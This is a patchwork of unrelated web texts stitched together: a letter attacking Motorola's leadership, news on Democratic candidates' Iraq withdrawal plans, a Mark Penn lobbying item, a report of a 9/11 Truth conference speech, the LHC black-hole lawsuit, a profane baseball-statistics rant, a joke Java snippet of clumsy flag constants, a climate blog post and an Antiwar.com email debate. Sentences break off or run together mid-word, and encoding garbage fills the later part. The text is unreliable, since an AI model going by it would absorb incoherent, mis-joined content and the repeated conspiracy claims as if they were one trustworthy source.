It was my experience at Motorola , with people like Geoffrey and all of the loyal employees who still remain , that taught me that Corporate America can and should be ; now , with people such as Zander and yourself , Motorola symbolizes the worst of Corporate America .
As an immigrant , and someone who has traveled all over the world , I really do appreciate the uniqueness and importance of the American culture of creativity and ingenuity ; whereas other countries back their money on gold and commodities , we back ours on our ability to invent the future .
As an American , I believe that the protection of this culture is more important than anything else — as such , I feel it necessary to publicly shame you and your incompetent executive team .
The failure of Motorola as an American institution of creativity and innovation , should you let it happen , will be entirely of your doing .
Hopefully you 'll keep that in mind while relaxing with your golden parachute .
Regards ,
Numair Faraz

As they travel the country searching for votes , each of the big three Democratic candidates for president has pledged to withdraw large numbers of troops from Iraq during their first year in office .
They also all say they oppose the construction and maintenance of permanent bases in Iraq .
Both Hillary Clinton and Barack Obama say they ’re planing to remove approximately 6,000 American soldiers from Iraq every month during the first year of their presidency .
" We will begin to withdraw our troops within 60 days , " Clinton promised last Sunday during an interview on NBC ’s Meet the Press program .
" I think we can take out one to two brigades a month , " she added .
" I will put increasing pressure on the Iraqi government .
I will work with all the countries in the region and others that have an interest in the stability of Iraq . "
Obama ’s official position also includes redeploying one to two brigades of combat troops from Iraq every month during the first year of his presidency .
Such a plan would leave approximately 50,000 American troops in Iraq at the end of 2009 .
" The only troops that would remain would be those who would protect U.S. bases and U.S. civilians as well as to engage in counter - terrorism activities in Iraq , " he said in an MSNBC debate last September .
Obama has also said some U.S. troops would stay behind to train Iraqi Security Forces .
Of the three , John Edwards has been the most sweeping in his desire to remove U.S. troops from Iraq , saying he envisions less than 5,000 troops would stay behind specifically to guard the U.S. Embassy and " humanitarian workers " in Iraq .
I think somewhere in the neighborhood of a brigade will have to be used to accomplish that , " he said in the MSNBC debate , " between 3,500 and 5,000 troops . "
With the main Democratic contenders positions so similar , observers are looking toward the politicians ’ voting history to see how they might act if elected .
" Unlike Barack Obama , who was against the war from the beginning , and John Edwards , whose shift to an antiwar position was earlier and apparently sincere , Hillary Clinton came out against the war barely a year ago when public opinion polls showed it would be virtually impossible to get the presidential nomination unless she did otherwise , " said Stephen Zunes , a professor of politics at the University of San Francisco and author of a three - part series on the candidates ’ foreign policies for the online journal Foreign Policy in Focus .
Zunes argued that among the Democrats , Hillary Clinton is the least likely to end the war .
" Hillary Clinton has supported Bush policy from the beginning , " Zunes told OneWorld .
" The Bush administration has also claimed that they want to pull back combat brigades and lessen the U.S. troop presence , but Hillary Clinton , like the Bush Administration , has basically said that whether or not we can do this depends on the situation on the ground and given that the situation on the ground is unlikely to improve much , I am personally skeptical that a Clinton administration would be very different than a continuation of the Bush administration . "
That ’s not how Representative Lynn Woolsey sees it .
The California Congresswoman is co-chair of the Congressional Out of Iraq Caucus .
She has endorsed Hillary Clinton .
" She ’s changed her mind on the Iraq war , " Woolsey told OneWorld .
" People do things that they get to change their minds on .
She ’s now voted three times for deadlines to bring our troops home  one was as recent as December  and she ’s committed that she will not vote for any funds other than to redeploy our troops . "
Woolsey also cited Clinton ’s " experience " as a senator and first lady as reasons for her endorsement .
" I believe she ’s the one that , when she ’s elected she will be on the ground running from the day that she ’s elected , " Woolsey said .
Professor Zunes does n’t see that change , though .
He says Hillary Clinton ’s foreign policy advisors indicate that she would continue to take a hawkish stand if elected .
" Richard Holbrooke , who Clinton would likely name as Secretary of State , was one of the strongest supporters of the war  even accusing those who objected to the war of disloyalty to America , " Zunes said , adding Clinton would likely appoint " other hawks who served in her husband ’s administration .
By contrast , Zunes said , Obama ’s advisors include the anti-genocide activist Samantha Powers of Harvard ’s Kennedy School of Government .
Professor Shakir Mustafa says many in the Arab world are excited about Obama .
Mustafa , a professor of Arabic languages at Boston University , grew up in Baghdad and most of his family still lives in Iraq .
" People in the Middle East perceived that change is possible when Obama entered the race and became a viable candidate , " Mustafa told OneWorld .
" He voted against the war .
Also people perceive because of his color or his origin that he will be more open to the third world than the rest of the candidates . "
Mustafa cautions , however , that there are major problems with Obama ’s plan to leave tens of thousands of so - called non-combat troops in Iraq .
He says those troops would easily end up in combat if they ’re attacked .
" It do n’t think that ’s practical , " he said .
" It might be practical and acceptable to the Kurds who are willing to accommodate such a presence , " he said .
" But I do n’t think in the rest of Iraq it will be viable .
I think they will be a target because there is large scale opposition to any permanent presence of American forces or any foreign forces in the Arab part of the country . "
" They will be open to attacks , " he said , " and they will open up another scar in the relationship between Iraq and the Untied States . "
Bennett Ramberg , who served in the State Department of the first President Bush , predicts that none of the top Democratic contenders will remove large numbers of U.S. troops if elected .
The Democrats do n’t want to be " saddled " with the debate over : " Who lost Iraq ? " he said .
" That ’s what they were saddled with in the late 1940s : ‘ Who lost China ? ’
They do n’t want to be saddled with that again .
They kept going in Vietnam because they did n’t want to be saddled with ‘ Who lost Vietnam ? ’
And so it was Richard Nixon who , after the losses of thousands of more American lives , finally got us out of Vietnam and then South Vietnam collapsed . "
" Are the Democrats ready to be saddled with ‘ Who lost Iraq ? ’ "
Ramberg asked .
" I have my doubts . "
Ohio Congressman Dennis Kucinich is also running for the Democratic nomination for president .
He pledges to remove all U.S. troops and contractors from Iraq within his first few months in office .
Kucinich received 1 percent of the vote in New Hampshire and is garnering similar support in national polls .

Just out from the Wall Street Journal …
Hillary Clinton ’s chief campaign strategist met with Colombia ’s ambassador to the U.S. on Monday to discuss a bilateral free - trade agreement , a pact the presidential candidate opposes .
Attendance by the adviser , Mark Penn , was confirmed by two Colombian officials .
He was n’t there in his campaign role , but in his separate job as chief executive of Burson - Marsteller Worldwide , an international communications and lobbying firm .
The firm has a contract with the South American nation to help promote congressional approval of the trade deal , among other things , according to filings with the Justice Department .
There are so many reasons why candidates should be paying Mark Penn to stay as far away from their campaigns as possible .
But this is yet another .
Having your key campaign advisor also be an international man of mystery - cum - PR - lobbyist - cheeseball is fairly problematic .
But for Hillary ’s sake , when her political future is on the line in a state like Pennsylvania , wracked by the loss of industrial jobs for decades , you think he could have waited a few more weeks before prancing off to help get a new free trade pact passed ?
Sydney Conference : 9/11 - Physics and Findings : Challenging the NIST Report
Dr. David Leifer , Registered Architect and Incorporated Engineer of the Faculty of Architecture , Design Science and Planning at the University of Sydney
In Sydney a conference is now under way challenging the official version and lack of investigation into what happened during the September 11 , 2001 attacks in the USA .
Dr David Leifer , Registered Architect and Incorporated Engineer of the Faculty of Architecture , Design Science and Planning at the University of Sydney was the first speaker at the conference .
" We 've all seen graphic video images of planes smashing into WTC 1 and 2 on 11th September 2001 , we also saw in real time the two towers spectacularly collapse , for which it appears obvious to all that the impact of the planes and subsequent fires were the cause " he started his speech .
Seemingly only a fool or subversive would question this chain of events ... " he said .
" The official explanation for a string of events surrounding 4 hijackings , the collapses of WTC 1 , 2 and 7 and the attack on the Pentagon are anomalous or involve such a large number of unlikely individual events that when strung together are so statistically improbable as to be impossible .
These anomalies are in some cases so blatant that one has to question the professional competence of the explainers -- or indeed , their independence and disinterestedness " Dr Leifer said .
" A growing number of credible people from all walks of life have also been struck by the chain of improbabilities : pilots who have examined the flight paths and flight recorders of the hi-jacked planes , architects and engineers who have studied the building 's structure and sequence of collapse ; security agents and politicians who question the response of the empowered authorities at the time ; and perhaps most poignantly the kin of those killed in the attacks whose quest for answers gave rise to the 9/11 Truth movement - the movement in whose name this Conference is called " Dr Leifer said .
" We who are supporting this conference are committed to maintaining the torch of inquiry as a moral duty until satisfactory explanations are presented that resolve these issues .
It is my sincere hope that this conference will help to bring the debate to a wider audience .
With this goal I bid you welcome " , he said .

More fighting in Iraq .
Somalia in chaos .
People in this country can’t afford their mortgages and in some places now they can’t even afford rice .
None of this nor the rest of the grimness on the front page today will matter a bit , though , if two men pursuing a lawsuit in federal court in Hawaii turn out to be right .
They think a giant particle accelerator that will begin smashing protons together outside Geneva this summer might produce a black hole or something else that will spell the end of the Earth  and maybe the universe .
Scientists say that is very unlikely  though they have done some checking just to make sure .
The world ’s physicists have spent 14 years and $ 8 billion building the Large Hadron Collider , in which the colliding protons will recreate energies and conditions last seen a trillionth of a second after the Big Bang .
Researchers will sift the debris from these primordial recreations for clues to the nature of mass and new forces and symmetries of nature .
But Walter L. Wagner and Luis Sancho contend that scientists at the European Center for Nuclear Research , or CERN , have played down the chances that the collider could produce , among other horrors , a tiny black hole , which , they say , could eat the Earth .
Or it could spit out something called a “ strangelet ” that would convert our planet to a shrunken dense dead lump of something called “ strange matter . ”
Their suit also says CERN has failed to provide an environmental impact statement as required under the National Environmental Policy Act .

Baseball Stats Mania Rates a Zero
Let 's go ahead and take it as a given that this turdpile may be tongue in cheek , or at the very least , bait .
If it 's a parody , it 's brilliant .
If it 's sincere , holy God .
And if it 's bait , well , I just bit , and it tastes delicious , even though I know the hook is about to pierce me through the lower jaw and drain my lifeforce .
Given the state of the economy and all the political mud slinging going on , I probably should be worried about my country these days .
But the truth is , I ’ve got more important things on my mind , including the most important thing of all .
Baseball .

Baseball has been around since they used cowpies for bases .
It has survived despite itself for this long , so there ’s no reason to think it wo n’t continue to .

When I was a kid hustling autographs at Wrigley Field , the game was all about W ’s and L’s .

Today , it ’s all about the numbers and the psychos who crunch them .
They call themselves sabermetricians .
I call them seamheads , among other things .

I ’m telling you , we need to stop these people before it ’s too late .
Before we ’re all walking around in a cyberfog talking in acronyms that only Stephen Hawking could understand .
President Bush , your basic baseball junkie , needs to swing into action in the best interests of the country .
He needs to have his Homeland Security Nazis break into these people ’s homes and take a Louisville Slugger to their computers .
If not , I may have to resort to drastic measures .
I may have to become a soccer fan .
Think about it .
There are no seamheads trying to take over the soccer world .
There ca n’t be because there are no numbers to crunch .
Well , a few maybe , but not enough to get all hot and bothered about .
Things are simpler in soccer .
There ’s no WHIP or VORP in soccer , just a few DOAs after the usual fan rowdiness in the stands .
In soccer , all the stats are the same .
All the goalkeepers have a .001 goals - allowed average and , at the end of the season , everyone ties for the league lead with one goal scored .
Not in baseball .
In the past few days alone , I ’ve come across such stats as OPS ( One- base Plus Slugging percentage ) ,
GWRBI ( Game Winning Runs Batted In ) ,
DIPS ( Do n’t Ask ) ,
You're
QERA ( Quantified Earned Run Average ) ,
WHIP ( Walks and Hits per Innings Pitched )
and BABIP ( Batting Average for Balls In Play ) .

Good thing Casey Stengel is n’t around to see this nonsense .
All this numbers crunching might have interrupted his nap in the dugout .

Ca n't quite pinpoint it .
At least it 's a hilarious joke , though .
Ha ha !
Fuck you , dude -- you 're too late Also , soccer is cool and fun to watch .
Right .
Which is why we need more statistical analysis .
Huh ?!?!?!?!
Da-whaaaaaa ?!?!
What 'd you call me ?
a DIPS !
That looks like " queer ! "
Heh heh heh heh heh !
Skler - boink ?!?!?!?!
Let me just get a few things straight .
( a ) You just found out about OPS ?
( b ) You just heard about GWRBI , a stat that was so mainstream it was briefly on the backs of baseball cards in the late 1980s before people realized it was dumb ?
( c ) You can't succinctly explain DIPS ?
Here
And that ... would be ... bad ?
Napping and smoking .
You know -- baseball .
What baseball should be .
Napping and smoking while you manage a professional baseball team . :
Thanks for meeting with us . :
Thank you for seeing me . : Look .
We are one of 30 professional baseball teams in the country .
The franchise is worth about $ 500 million , give or take .
We have a brand new stadium , partially financed by the taxpayers of this county .
The revenue of our sport last year was roughly $ 7 billion .
You are going to control a roster of 24 - 40 men , the average salary of whom is north of $ 3 million .
They come from Canada , the U.S. , Central America , South America , Australia , South Korea , Japan , and several Caribbean Islands .
You have to make sure that they are used correctly , that their egos are in check , that they can withstand the grind of a 162 - game schedule , that they do n't do stupid extra-curricular shit like go to strip clubs , and you need to be aware of which guys are in trouble with steroids , which guys need carrots and which need sticks , and you 'll need to soothe the feathers of the veterans ( and rookies ) who get sent down , and you have to do all of this while winning at least 90 games . :
Got it . :
So , what will you do during the average game ? : Nap and smoke . :
You 're hired . : Great . :
Now you 're fired .
I wanted to hire you just so I could fire you . : But Casey Stengel napped !:
He managed the fucking Yankees from 1949 to 1960 .
You 'd 've napped too , if you had those players . :
And Earl Weaver smoked !:
He also used stats .
A lot .
He famously encouraged his hitters to walk and knew the value of 3 - run homers .
Get out of my office .
Look .
It may be true that I have no friends , no wife , no children , and that I live in a soggy refrigerator crate in my mom 's basement .
That 's no reason to beI guess my hope is that by dreaming up new stats , I will somehow attract the attention of a nice , introverted , monobrowed nerd girlfriend with bad teeth who will take pity on me and marry me and we can have nerd children who will grow up to be rocket scientists and develop a secret Doomsday DeviceShut up .
Seriously , man , shut the fuck up .
This is like saying , " I do n't like action movies , so no one can ever enjoy action movies because action movies are terrible . "
If you do n't want to use stats , do n't use them .
I do n't care .
But for the love of goddamned God , do n't tell me that statistical analysis " does n't add up to enjoyment of the game . "
You are telling me that my friends and I are incapable of enjoying baseball .
I promise you -- I PROMISE you -- I enjoy baseball .
I love baseball .
This is not a situation where only one kind of person can love baseball .
Lots of different people can love baseball for lots of different reasons .
In my case , I love baseball every bit as much as you , but -- and here 's the difference between you and me -- I alsoit .
If you are interested in learning how to understand it , just ask .
I can teach you in like 10 minutes .
( And I do n't even know that much about sabermetrics . ) ( a) Fuck off , again , and ( b ) hit me ... Blammo .
Nailed the joke .
I give up .
I will crawl into your cave with you and relearn how to enjoy baseball without using any part of my brain .
Just my stomach .
And we 'll be alcoholics together and high - five a lot and yell " You Suck " at opposing players .
Sounds like a good time .
Labels : f( f( f( x ) ) ) , food acronyms , jim armstrong , liberal use of " food metaphors " label , mother 's basement , sabermetrics , statistics
Pop quiz , hot shot .
There are seven different true / false flags .
You have only a single integer to represent them .
What do you do ?
What do you do ?
When Stephan E's predecessor was faced with this problem , he knew exactly how to handle things .
He used the integer to store a bit pattern .
Of sorts .
Well ... kinda ...
public class BestMatchedEntity { public static final int MATCH_EMAIL_ONLY = 0001000 ; public static final int MATCH_LNAME_ONLY = 1000000 ; public static final int MATCH_LNAME_DOB = 1100000 ; public static final int MATCH_LNAME_DOB_EMAIL = 1101000 ; public static final int MATCH_LNAME_DOB_FNAME = 1110000 ; public static final int MATCH_LNAME_DOB_FNAME_ADDR
= 1110001 ; public static final int MATCH_LNAME_DOB_FNAME_TELNO
= 1110010 ; public static final int MATCH_LNAME_DOB_FNAME_TELNO_ADDR
= 1110011 ; public static final int MATCH_LNAME_DOB_FNAME_REFNO
= 1110100 ; public static final int MATCH_LNAME_DOB_FNAME_REFNO_ADDR
= 1110101 ; public static final int MATCH_LNAME_DOB_FNAME_REFNO_TELNO
= 1110110 ; public static final int MATCH_LNAME_DOB_FNAME_REFNO_TELNO_ADDR
= 1110111 ; public static final int MATCH_LNAME_DOB_FNAME_EMAIL
= 1111000 ; public static final int MATCH_LNAME_DOB_FNAME_EMAIL_ADDR
= 1111001 ; public static final int MATCH_LNAME_DOB_FNAME_EMAIL_TELNO
= 1111010 ; public static final int MATCH_LNAME_DOB_FNAME_EMAIL_TELNO_ADDR
= 1111011 ; public static final int MATCH_LNAME_DOB_FNAME_EMAIL_REFNO
= 1111100 ; public static final int MATCH_LNAME_DOB_FNAME_EMAIL_REFNO_ADDR
= 1111101 ; public static final int MATCH_LNAME_DOB_FNAME_EMAIL_REFNO_TELNO
= 1111110 ; public static final int MATCH_LNAME_DOB_FNAME_EMAIL_REFNO_TELNO_ADDR
= 1111111 ; public static final int NUM_OF_MATCH_FIELDS = 7 ; ... }
And how exactly did this bit pattern get used ?
Well ...
if ( hasLastName && has Dob && has FirstName && has Email && hasRefNo && hasTelNo && hasAddr ) { matchPattern = MATCH_LNAME_DOB_FNAME_EMAIL_REFNO_TELNO_ADDR ; } else if ( hasLastName && has Dob && has FirstName && has Email && hasRefNo && hasTelNo && ! hasAddr ) { matchPattern = MATCH_LNAME_DOB_FNAME_EMAIL_REFNO_TELNO ; } else if ( hasLastName && has Dob && has FirstName && has Email && hasRefNo && ! hasTelNo && has Addr ) { matchPattern = MATCH_LNAME_DOB_FNAME_EMAIL_REFNO_ADDR
; ( hasLastName && has Dob && has FirstName && has Email && hasRefNo && !
hasTelNo && ! hasAddr ) { matchPattern = MATCH_LNAME_DOB_FNAME_EMAIL_REFNO ; ...
The above graph compares predictions made by the IPCC ( pretty much the consensus ) to reality ( black line ) .
You can see the predictions do n't match reality very well .
The reality is much , MUCH worse than the scientific consensus predicted .
The arctic ice cap is melting decades faster than expected .
DECADES .
The " skeptics " implied there are only two possibilities : either the scientific consensus is right , or global warming is not as bad as the scientists think .
Nature had other ideas , as She often does .
In this critical area , global warming is happening far faster , and with far more severity , than most scientists had predicted .
But do n't blame the scientists .
They are very much aware of the weaknesses of their models and theories .
And many have highlighted the risk of the climate suddenly " lurching " to a whole new " normal " state .
Jim Hansen has repeatedly warned that the IPCC may have underestimated ice melt .
Once again , he appears to have been vindicated .
Science Writer Fred Pearce wrote an excellent book about this issue : With Speed and Violence : Why Scientists Fear Tipping Points in Climate Change .
Here 's a passage from the introduction , which is an excellent summary of climate scientists ' warnings about their own models .
" Nature is fragile , environmentalists often tell us .
But the lesson of this book is that that it is not so .
The truth is far more worrying .
She is strong and packs a serious counter - punch .
Global warming will very probably unleash unstoppable planetary forces .
And they will not be gradual .
The history of our planet 's climate shows that it does not do gradual change .
Under pressure , whether from sunspots or orbital wobbles or the depredations of humans , it lurches - virtually overnight . "
And the next time someone tells you that we are not yet certain about the reality of climate change , or that the effects might not be as bad as predicted , make one simple point :
Uncertainty cuts both ways .
Update :
The above image comes from University of Illinois Polar Research Group via Jeff Masters ' blog ( scroll down ) .
Greenland 's ice is shown in white ( virtually no visible change , yet ) .
Arctic ice is shown in magenta ; thicker regions in darker shades ( scale on left ) .
Masters and UIUC have more discussion on their sites .
Update :
Those new to all this who want to learn more are strongly encouraged to read the blog RealClimate : Climate Science from Climate Scientists .
Also , you can search their archives for their older coverage of climate issues and controversies .

Two weeks ago , Antiwar.com received a letter from a non-commissioned officer in the U.S. Marine Corps wondering what motivated our behavior .
One of my jobs for Antiwar.com is handling letters like these , and since he asked like a gentleman , Iâ€™ve done my best to represent the site and the case against the war .
What follows , with his permission and with his name and rank omitted , is our discussion : Date : Sun , 16 Dec 2007 21:05:06 - 0800 To : @antiwar.com Subject : Inquiry from websiteâ€ ” -( USMC ) submitted a linkâ€ ¦here are the results !
Subject : motive
I just want to know what your reason is for starting a website of such substance .
As a Marine who anti-war activists commonly bash , I always seem to be on the offense while discussing the matter of war .
Did I do something wrong ?
I want to serve my country and hopefully , keep my children from fighting these battles in fifteen years .
Because , we all know that if we donâ€™t keep the terrorists â€œover there , â€ they will inevitably , end up , â€œover here .â€
Maybe your opinions contradict .
To debate would be a welcome experience .
You can definitely consider that a challenge .
Best regards .

Subject : Re : Fwd : Inquiry from website
â € ”â€ “ ,
â €“ Thanks for your challenge , I accept and mean to change your mind about some things .
â €“ First an answer to your question why do we do Antiwar.com http://antiwar.com/?:
The site was begun in 1995 in opposition to Bill Clintonâ€™s wars in the Balkans .
All the staff are libertarians – like Ron Paul – but we feature articles from all political positions in opposition to foreign intervention .
( Youâ€™ll notice that most of our in - house writers are libertarians and conservatives . )
As to the why , well , we do it for the same reason you fight in the Marines : To protect Americansâ€™ freedom .
Remember how the founders were wary of standing armies ?
It was because permanent military establishments and war are detrimental to liberty .
War is the health of the state .
And the U.S. has been at war or on a permanent war footing since WWII .
Hence , we have the national security state , homeland security state , the PATRIOT Act ( illegal searches ) , Military Commissions Act ( legalizes torture ) , Protect America Act ( tapping phones ) and on and on * because * we have Marines all over the world waging war .
And conversely , none of these laws will ever be repealed as long as we are at war .
â €“ Now I can see how a freedom loving patriot like yourself would reason that even though our Constitutional system here at home may be suffering for the short term , it is worth it to bring the war to our countryâ€™s enemies to protect us for the long term .
And you would be right , but for the fact that your first assumption about we all know that warring now prevents worse war later is fatally flawed .
â €“ For example , if Europe , China and Russia were to send their navies to invade and occupy our land , we would all tolerate Commander in Chief Bush taking extraordinary measures to coordinate our defense , including running roughshod over state governors , seizing certain property , etc .
It would be horrible , but worth it in that case .
But the war on terrorism is different .
â €“ In this case , we have a very small band of jihadists who would or could attack the U.S.
They are , at this point , holed up in exile in the Hindu Kush .
They donâ€™t control a single country on earth .
The local Sunnis in Iraq have shown that they could turn â€œal Qaeda in Iraqâ€  off like a switch when they felt like it .
â €“ Bin Laden was looking at a fractured bunch of Afghan - Russian war leftover jihadists and wanted to unite them .
The attacks on America were his attempt to lure the US into occupying Afghanistan ( Iraq was a bonus for them ) so they could recreate the old war against the USSR .
The plan was to bleed our treasury dry and wear our military out , thereby forcing our government out of the region permanently .
( The six objections to U.S. policy that the CIA says he cited over and over were : 1 : U.S. bases in Saudi Arabia , 2 : Support for Israel over the Palestinians , 3 : Support for tyrannies in Egypt , Saudi , Qatar , Kuwait , Jordan , UAE etc. , 4 : Pressure on them to keep prices set where Houston wants them , 5 : The blockade and no-fly zone bombings against Iraq [ now replaced on the list by invasions and occupations of Iraq and Afghanistan ] , 6 : Support for Russia , China and India in their wars against Muslims .
In other words , al Qaeda recruiter schtick is all about U.S. empire in their countries [ not about hating freedom and democracy ] .
This is why ALL of the 9/11 hijackers were from â€œfriendlyâ€  Middle Eastern countries [ Egypt , Saudi , Yemen ] , not Iraq , Iran or Syria . )
â €“ As we can see , bin Laden was able to provoke exactly the reaction he wanted out of the U.S. , but has failed completely at rallying the Muslim world to his cause .
They are more radicalized than ever , but sure donâ€™t seem interested in being ruled by him any more than us .
â€“ Further , in the book Dying to Win : The Strategic Logic of Suicide Terrorism , Dr. Robert Pape traced the histories of thousands of suicide bombers – all of them , failed and successful , between 1980 and 2004 .
What he found was that virtually all of them were attacking forces that were occupying their land .
The most suicide bombing is in Sri Lanka where neither side is Muslim .
Sudan is a Sunni Arab land , with a lot of Waahabi extremism and widespread violence – but no one has ever done a suicide bombing there because itâ€™s a civil war and they are not being occupied by a foreign power – yet .
Just wait for the suicide bombers to come out of the woodwork when Hillary sends the â€œpeace force.â€ 
In 2005 , the Saudis and Israelis both did studies tracing the jihadists who went to Iraq to kill Americans .
99 % of them were young people radicalized by the invasion of Iraq itself .
They werenâ€™t violent fighters before the invasion at all .
The CIA and British MI - 6 have both come to similar conclusions .
Ayman al Zawahiri has said he wants us to stay in Iraq until 300,000 have been killed , that way we wonâ€™t be back .
Al - Whatâ€™s - his - name who took over AQI after Zarqawi likewise complained of the danger to their movement if the U.S. were to withdraw .
â €“ Here is a page of interviews I did with all CIA guys and Pape the author of the book cited above after Giuliani attacked Ron Paul for saying essentially what I have said above .
They all said Paul was right , including the former chief of the CIAâ€™s bin Laden unit who gave Bill Clinton 10 chances to kill bin Laden .
â €“ So the best way to fight terrorism is to kill the guys who did 9/11 ( finally ) and then get our combat forces off of other peopleâ€™s holy land .
The remaining al Qaeda in the world can be wiped out by the worldâ€™s national governments ’ intelligence agencies and cops – with Marines for the occasional really tough jobs – no problem , IF we scale back the empire that we shouldnâ€™t have anyway .
â €“ As CIA man Scheuer once told me , the choice is war or total war .
If we scale back the occupations and just go after the actual bad guys , thatâ€™s war .
If we let the neocon crazies talk us into a war of civilizations against the whole Muslim world , then thatâ€™s what weâ€™ll get .
â €“ Eagerly awaiting your reply ,
Best ,

â€ ”- ,
My responses belowâ€ ¦
â€ ”- wrote : Mr. Horton ,
First let me say this .
Changing my mind about anything that I feel strongly on is no easy task .
I would go so far as to say that it is nearly impossible in most matters .
Iâ€™m sure you feel the same way about my swaying your opinion .
â €“ Yes , I do as well .
Iâ€™ll take extra satisfaction in changing yours when I do . : )
I donâ€™t get the impression that your organization would fall into the realm of such activists that picket servicememeberâ€™s funerals shouting babykiller .
Sadly it has happened with other groups .
Now , if that is the type of activism that you advocate , well , quite simply , I hope you burn in hell .
Tell your friends I said that too .
But , I questioned your motives anyway because I have my qualms with these campaigns myself .
â €“ First of all , Antiwar.com would never have anything to do with any groups that did such things , but secondly , you should know that the only group that has protested military funerals has been the wacked out church of a right - wing nut named Phelps , whose very small but dedicated supporters protest with signs saying â€ œGod hates Americaâ€ and â€ œGod hates fagsâ€  – his position is that as long as there are any gay people in the U.S.
Army then God-uh will strike down our sinful nation .
This clearly has nothing to do with Anyone in the antiwar movement whatsoever .
â €“ The only insincere motives Iâ€™ve seen in the antiwar movement comes from some on the communist left who want to use opposition to the war to boost themselves .
I think they prefer that thereâ€™s a war just so they can oppose it .
Iâ€™ve never heard of them protesting any funerals though .
Many anti-war stances have clout and I donâ€™t mind examining them .
â €“ Thatâ€™s why I took the trouble to write that long response .
You obviously came looking for an honest debate and opportunity for us to understand each other .
I canâ€™t honestly say that I disagree with the points you make in your letter .
You raise good points such as the study done by international intelligence agencies to determine the motivation of these insurgent fighters .
That is a well known fact among Marines and soldiers believe me .
It is an inevitable domino effect that begins with one sorrowful act of an innocent civilian being caught in the crossfire .
His brother vows revenge and attacks coalition forces .
He is killed and then his son vows revenge and so on .
That is where the problem lies .
â €“ Which came first , the chicken or the egg ?
I will tell you now why I disagree with your opinions that you have so thoroughly reinforced with he - said - she - said type of evidence .
â € “ I do not believe I made the fallacy of argument from authority .
I tried my best to make my argument myself and cite important footnotes where further reading can be found .
First :
There is the implication that if we withdrew our forces from abroad it would seem to end our social and economical difficulties .
Well , sure , some of it .
But it would create others .
For instance , hypothetically of course , if we were to return our forward deployed forces to the United States , the next step would be to downsize the military .
It would only be natural .
That would in turn create a massive influx of unemployed veterans who have no home , no job and a heavy reliance on government assistance .
especially individuals who are handicapped due to battle related injuries .
â €“ Right now the U.S. government spends over a Trillion dollars a year on war .
That is money that is taken out of the productive economy and given to the Pentagon to waste .
Thatâ€™s money that would have been invested , spent on salaries , given as grants , etc. , etc .
Empire costs our society so much money with nothing to show for it .
As the Old Right author Garet Garrett once wrote , â€ œThe winds that blow our billions away return burdened with themes of scorn and dispraise.â€ 
â €“ And surely you recognize that more war and more empire means more wounded veterans , not less .
The economists are already saying the Iraq war – never mind the rest of it – will end up costing 3 Trillion dollars or more .
Again that is all money taken from productive use by private citizens ( who have no choice but to pay or go to jail , by the way ) .
Second :
The assumption that the CIA , or any of our covert agencies for that matter , can defeat jihadists in Afghanistan without military support , is naive at best .
I can tell you from personal experience working with operatives when I was there that the tactics that had to be employed by these agencies are extremely cost - ineffective and turn up little result .
â €“ Remember , I said Marines should be used where necessary .
But thereâ€™s a big difference between actually fighting al Qaeda in Waziristan and propping up Karzai and fighting the Taliban ( which our ally Pakistan still supports ) , drug wars and the rest of it .
â €“ In 2001 the CIA called the local general with his 4,000 marines and said help us out at Tora Bora .
The general called Tommy Franks and was told no .
Bin Laden escaped that night .
Third :
You include a paragraph discussing the nature of motives behind suicide bombings .
Well , in case you havenâ€™t watched the news , since 2004 those figures became obsolete .
Now that we have deposed the dictator of Iraq , there is no one to oppress the other secular muslim groups there .
Civil violence has blown up over there .
Literally .
The insurgents now target Iraqis who are assisting coalition forces .
As much of a hindrance as we are on the average Iraqiâ€™s daily life , we also progress their future .
That is one reason why the mullahs donâ€™t advocate attacks against us so much anymore .
But they have no problem killing members of another branch of Islam .
â €“ Please reread what you just wrote there .
The suicide bombers fight the U.S. occupation and those who collaborate with it .
â € “ I fail to see how this does anything but make the case Iâ€™m making .
â €“ There had Never been a suicide bombing in Iraq before 2003 – Never .
Now our foreign military occupies it and suicide bombings are all the rage .
Whether or not Bin Ladenâ€™s ambition behind 9/11 was to draw us into Afghanistan to destroy our economy like the USSR is a very very thin hypothesis .
â €“ The furthest thing from it .
He said so over and over as did Zawahiri .
See his October 2004 speech for example .
http://www.cnn.com/2004/WORLD/meast/11/01/binladen.tape/index.html
http://english.aljazeera.net/English/archive/archive?ArchiveId=7403
Donâ€™t forget , we funded , trained , and equipped the Afghani fighters in that era .
â € “ I havenâ€™t forgotten .
More on that below .
The Al Qaeda fighters that were up against us had nowhere near that level of support for this campaign !
â €“ Right .
Thatâ€™s just what I said in my first response .
Even though the U.S. has done exactly what bin Laden wanted and more , the Muslim world has still not rallied around him and he remains nearly powerless in exile in the Hindu Kush .
Weâ€ ™re still going broke though .
The problem in Afghanistan now is that the exiled Taliban are growing in numbers and strength .
Karzai begs us to stay any time we get a foot out the door because he realizes that after we leave , his government isnâ€™t strong enough to keep the entire nation from collapsing and creating a collage of locally controlled warlord states .
â €“ As Governor George W. Bush once said , â€ œWhatâ€™s the exit strategy ? â€ 
There isnâ€™t one .
Afghanistan is meant to be a permanent colony of the U.S. , but why ?
What interests of Americaâ€™s are served by the policy ?
Few to none at all .
Why should Hamid Karzai be the lord of those people ?
What right do we have to put him there ?
Plus , we slashed alot of opium and cannabis crops there .
Because Americans donâ€™t believe in drugs we have to destroy the strongest market item that the country offers and give them bags of wheat .
Before the invasion of Afghanistan , 80 % of the worldâ€™s heroin supply was derived from opium exported from Afghanistan and surrounding areas .
So that leaves us in a pretty bad spot .
We donâ€™t want them to grow opium but we offer no reasonable alternative .
It would be irresponsible of us to turn our backs to it due to the drug problem in todayâ€™s America .
But then again , in the third poorest country on earth , Afghanis need to feed their families as we do .
Fix that one .
â €“ Thatâ€™s easy .
Let them trade in whatever they want .
The destruction of their crops only drives up the price and makes growing it all the more attractive .
Drug wars are stupid .
Doctors world - wide use opiates on their patients every day .
Why shouldnâ€™t Afghanistanis be allowed – by Americans – to sow and reap a cash crop ?
Insanity .
( PS : legalizing drugs would go a hell of a long way toward solving Americaâ€™s domestic drug addiction problems as well . )
Iraq .
If we left tomorrow there would be a genocide and a three way civil war .
Then we will read about it in the papers and see it on TV and there will be an outcry from narcissistic george clooney types to â€œstop the violence !â€ 
So guess where the Marines go ?
â €“ Well , darn it , whose fault is that ?
They had a secular dictator , then the U.S. invaded and screwed everything up .
Now those who opposed the war and advocate withdrawal are to be held responsible for the consequences ?
I donâ€™t think so .
Besides , as you probably well know , the U.S. supports all the Iraqi secessionists ( who need us ) : The Supreme Islamic Council and Daâ€™wa ( in league with Iran ) and the Barzani and Talabani factions in Kurdistan .
The violence between them and the former Baâ€™athist Sunnis makes our permanent military bases â€œnecessaryâ€ while the nationalists want us out ASAP .
